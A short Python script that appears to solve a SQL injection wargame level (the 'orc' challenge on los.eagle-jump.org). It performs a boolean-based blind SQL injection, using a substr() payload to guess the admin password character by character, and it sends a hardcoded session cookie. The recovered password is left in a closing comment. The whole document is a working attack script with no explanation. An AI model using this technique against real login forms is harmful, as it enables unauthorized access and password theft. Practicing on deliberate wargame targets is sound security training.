import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 9):
    for j in range(40, 127):
        url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
        data = "' or id='admin' and substr(pw, 1, {})='{}'#".format(
            str(i), key + chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=8mm14nl1otetnlimq9orjqa350"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)


# 295d5844
